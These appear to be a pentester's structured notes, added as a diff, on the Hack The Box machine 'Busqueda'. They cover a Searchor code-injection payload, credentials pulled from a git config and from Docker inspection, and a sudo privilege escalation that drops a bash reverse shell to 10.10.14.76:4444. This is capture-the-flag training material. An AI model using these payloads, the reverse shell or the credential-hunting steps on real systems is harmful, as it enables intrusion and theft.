@@ -1,0 +1,70 @@
+Busqueda:
+  Ports:
+    - 22 (SSH)
+    - 80 (HTTP)
+
+  Website (http://searcher.htb/):
+    Redirects to: http://searcher.htb/
+    Subdomains: None
+    Technologies:
+      - Flask 2.1.2
+      - Python 3.10.6
+      - Searchor 2.4.0:
+        Vulnerable to Code Injection (Source=Snyk Vulnerability DB):
+          def search(engine, query, open, copy):
+            url = eval(f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})")
+
+    Endpoints:
+      /search:
+        Request example:
+          Send: "engine=Apple&query=Hello+World"
+          Return: "https://www.apple.com/search/Hello%20world"
+
+        Test request:
+          Send: "engine=Apple&query=') + 'hey'#"
+          Return: "https://www.apple.com/search/hey"
+        
+        Write exploit:
+          "SearchorCodeInjection.py"
+
+  Shell as svc:
+    id: Only user group
+    /etc/passwd: "svc:1000:/home/svc"
+    /etc/hosts: "127.0.1.1 busqueda searcher.htb gitea.searcher.htb"
+    Listening ports:
+      - 22 (SSH)
+      - 3000 (Gitea)
+      - 222 (Gitea SSH)
+      - 44197
+      - 5000 (searcher.htb)
+      - 3306 (MySQL)
+      - 80 (Apache2)
+    /home/svc:
+      .gitconfig:
+        "email = cody@searcher.htb"
+        "name = cody"
+    /var/www/app/.git/config:
+      "url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git":
+        Creds: "cody:jh1usoih2bkjaspwe92":
+          VALID USER CREDS
+    sudo -l:
+      "(root) /usr/bin/python3 /opt/scripts/system-checkup.py *"
+    /opt/scripts/system-checkup.py:
+      "Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)"
+      Actions:
+        - docker-ps
+        - docker-inspect:
+          Command Injection: None
+          "format '{{json .Config}}'":
+            - "GITEA__database__USER=gitea"
+            - "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh"
+            - "GITEA__database__NAME=gitea"
+        - full-checkup:
+          "Something went wrong":
+            Debugging:
+              - Works when CWD=/opt/scripts
+              - Works when 'full-checkup.sh' in CWD:
+                full-checkup.sh:
+                  "#!/bin/bash"
+                  "bash -i >& /dev/tcp/10.10.14.76/4444 0>&1"
+
